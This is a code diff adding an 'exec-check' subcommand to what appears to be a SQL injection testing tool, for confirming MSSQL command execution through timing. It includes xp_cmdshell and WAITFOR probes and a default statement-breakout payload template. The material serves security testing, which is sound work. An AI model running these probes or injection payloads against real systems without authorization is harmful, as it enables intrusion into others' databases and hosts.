@@ -194,6 +194,30 @@ def build_parser() -> argparse.ArgumentParser:
     rc.add_argument("--json", dest="rce_json", action="store_true",
                     help="emit findings and verdict as JSON instead of a report")
 
+    xc = sub.add_parser("exec-check", help="actively confirm command execution "
+                                           "via a timing side channel (MSSQL)")
+    add_common(xc)
+    xc.add_argument("--probe", dest="exec_probes", action="append", default=[],
+                    choices=list(rce.EXEC_PROBES_BY_KEY) + ["auto"],
+                    help="which execution probe(s) to run (repeatable; default "
+                         "auto = WAITFOR control + both xp_cmdshell variants)")
+    xc.add_argument("--exec-sql", dest="exec_sql",
+                    help="custom delay statement with a {secs} placeholder "
+                         "(overrides --probe; e.g. an OLE/CLR one-liner)")
+    xc.add_argument("--exec-delay", dest="exec_delay", type=float, default=5.0,
+                    help="seconds the probe sleeps when it executes (default 5)")
+    xc.add_argument("--exec-payload", dest="exec_payload",
+                    default=rce.DEFAULT_EXEC_PAYLOAD,
+                    help="breakout wrapper around the delay statement; must "
+                         "contain {sql} (default \"'; {sql} --\")")
+    xc.add_argument("--exec-trials", dest="exec_trials", type=int, default=2,
+                    help="delayed trials per probe (default 2)")
+    xc.add_argument("--no-scale-check", dest="exec_scale", action="store_false",
+                    default=True,
+                    help="skip the double-delay scaling confirmation")
+    xc.add_argument("--json", dest="exec_json", action="store_true",
+                    help="emit results as JSON instead of a report")
+
     sub.add_parser("version", help="print version")
     return p
 
@@ -600,6 +624,48 @@ def cmd_rce(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
     else:
         print(rce.format_report(findings, summary))
         logger.info(f"{engine.oracle.requests_completed} oracle requests")
+        logger.info("run `exec-check` to actively confirm real command execution")
+    return 0
+
+
+def cmd_exec_check(cfg: Config, args: argparse.Namespace, logger: Logger) -> int:
+    if cfg.dialect != "mssql":
+        logger.error(f"exec-check is MSSQL-only (dialect is {cfg.dialect!r})")
+        return 2
+    try:
+        probes = rce.resolve_exec_probes(
+            getattr(args, "exec_probes", None), getattr(args, "exec_sql", None))
+    except ValueError as exc:
+        logger.error(str(exc))
+        return 2
+
+    engine = _build_engine(cfg, logger)
+    results = []
+    with _GracefulStop(engine, logger):
+        for probe in probes:
+            if engine.cancelled():
+                break
+            logger.info(f"verifying: {probe.title} (delay {args.exec_delay:g}s)")
+            res = rce.verify_execution(
+                engine, probe,
+                delay=args.exec_delay,
+                payload_template=args.exec_payload,
+                trials=args.exec_trials,
+                scale_check=args.exec_scale,
+                on_progress=(lambda m: logger.info(f"  {m}")) if cfg.verbosity else None,
+            )
+            logger.info(f"  -> {res.verdict.value}")
+            results.append(res)
+
+    if getattr(args, "exec_json", False):
+        print(json.dumps({
+            "results": [r.to_dict() for r in results],
+            "os_exec_confirmed": any(r.confirmed and r.proves_os_exec for r in results),
+            "requests_completed": engine.oracle.requests_completed,
+        }, indent=2))
+    else:
+        print(rce.format_exec_report(results))
+        logger.info(f"{engine.oracle.requests_completed} requests")
     return 0
 
 
@@ -634,6 +700,8 @@ def main(argv: Optional[list] = None) -> int:
             return cmd_wizard(cfg, args, logger)
         if args.command == "rce":
             return cmd_rce(cfg, args, logger)
+        if args.command == "exec-check":
+            return cmd_exec_check(cfg, args, logger)
     except ScopeError as exc:
         print(f"scope error: {exc}", file=sys.stderr)
         return 3
